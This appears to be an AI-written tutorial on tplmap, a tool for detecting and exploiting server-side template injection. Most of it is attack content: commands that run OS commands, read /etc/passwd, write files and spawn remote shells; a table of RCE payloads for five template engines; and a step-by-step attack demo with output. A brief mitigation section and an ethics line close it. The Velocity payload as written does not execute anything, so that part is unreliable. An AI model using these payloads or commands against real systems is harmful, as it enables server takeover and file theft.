### **TPLMAP: The Ultimate SSTI Exploitation Tool**

**TPLMAP** is an automated penetration testing tool designed to detect and exploit **Server-Side Template Injection (SSTI)** vulnerabilities. It supports multiple template engines (e.g., Jinja2, Twig, ERB, Freemarker) and can escalate attacks to **Remote Code Execution (RCE)** or **file disclosure**.

---

## **Key Features of TPLMAP**

1. **Automatic Engine Detection**
   - Identifies the template engine (e.g., Jinja2, Twig, ERB) by probing responses.
2. **Exploitation**
   - Executes OS commands, reads files, and bypasses sandbox restrictions.
3. **Support for Multiple Engines**
   - Works with **Python (Jinja2, Mako)**, **PHP (Twig, Smarty)**, **Ruby (ERB)**, **Java (Freemarker, Velocity)**, and more.
4. **Interactive Shells**
   - Spawns **OS shells** or **template evaluation shells** post-exploitation.
5. **WAF Evasion**
   - Uses encoding and obfuscation to bypass Web Application Firewalls (WAFs).

---

## **How TPLMAP Works**

### **1. Installation**

```bash
git clone https://github.com/epinna/tplmap.git
cd tplmap
pip install -r requirements.txt
```

### **2. Basic Usage**

```bash
python tplmap.py -u "http://example.com/page?name=test"
```

- **`-u`**: Target URL with a vulnerable parameter (`name=test`).
- TPLMAP auto-detects the engine and tests for SSTI.

### **3. Exploitation Examples**

#### **A. Remote Code Execution (RCE)**

```bash
python tplmap.py -u "http://example.com?input=test" --os-cmd "id"
```

- Runs the `id` command on the server.

#### **B. File Disclosure**

```bash
python tplmap.py -u "http://example.com?input=test" --file-read "/etc/passwd"
```

- Reads `/etc/passwd` from the server.

#### **C. Interactive Shell**

```bash
python tplmap.py -u "http://example.com?input=test" --os-shell
```

- Spawns an **interactive OS shell** (if RCE is possible).

---

## **Supported Template Engines**

| **Engine** | **Language** | **Example Payload**                                                                      |
| ---------- | ------------ | ---------------------------------------------------------------------------------------- |
| Jinja2     | Python       | `{{ ''.__class__.__mro__[1].__subclasses__()[401]('id') }}`                              |
| Twig       | PHP          | `{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}` |
| ERB        | Ruby         | `<%= system("id") %>`                                                                    |
| Freemarker | Java         | `<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }`                  |
| Velocity   | Java         | `#set($exec="Runtime.getRuntime().exec('id')")`                                          |

---

## **Advanced TPLMAP Flags**

| **Flag**       | **Purpose**                             | **Example**                             |
| -------------- | --------------------------------------- | --------------------------------------- |
| `--engine`     | Force a specific engine (e.g.,`jinja2`) | `--engine jinja2`                       |
| `--os-cmd`     | Execute an OS command                   | `--os-cmd "whoami"`                     |
| `--file-read`  | Read a file from the server             | `--file-read "/etc/passwd"`             |
| `--file-write` | Upload a file to the server             | `--file-write "local.txt" "remote.txt"` |
| `--eval`       | Evaluate template code                  | `--eval "{{ 7*7 }}"`                    |
| `--tamper`     | Obfuscate payloads to bypass WAFs       | `--tamper "base64encode"`               |

---

## **Step-by-Step Attack Demo**

### **1. Detect SSTI**

```bash
python tplmap.py -u "http://example.com?name=test"
```

- If vulnerable, TPLMAP outputs:
  ```
  [+] Engine: Jinja2
  [+] Injection: {{7*7}} => 49
  ```

### **2. Escalate to RCE**

```bash
python tplmap.py -u "http://example.com?name=test" --os-cmd "id"
```

- Output:
  ```
  uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)
  ```

### **3. Spawn a Shell**

```bash
python tplmap.py -u "http://example.com?name=test" --os-shell
```

- Provides an interactive shell:
  ```
  $ cat /etc/passwd
  root:x:0:0:root:/root:/bin/bash
  ```

---

## **Mitigation Against TPLMAP/SSTI**

1. **Avoid Unsafe Template Rendering**

   ```python
   # UNSAFE (Flask/Jinja2)
   return render_template_string("Hello, " + username)

   # SAFE
   return render_template("index.html", name=username)
   ```

2. **Sandbox Template Engines**
   - Disable dangerous functions (e.g., `os`, `subprocess` in Python).
3. **Input Validation**
   - Reject template syntax (e.g., `{{`, `<%`) in user inputs.
4. **Use WAFs**
   - Deploy **ModSecurity** or **Cloudflare** to block SSTI payloads.

---

## **Real-World SSTI Exploits with TPLMAP**

- **Uber (2016)**: Jinja2 SSTI in internal tools led to RCE.
- **Algolia (2018)**: Twig SSTI in Symfony apps allowed server takeover.

---

### **Conclusion**

- **TPLMAP** automates SSTI detection and exploitation.
- **Critical Impact**: RCE, file access, and server compromise.
- **Always test ethically** with proper authorization.

Need help setting up a lab to practice? Let me know!
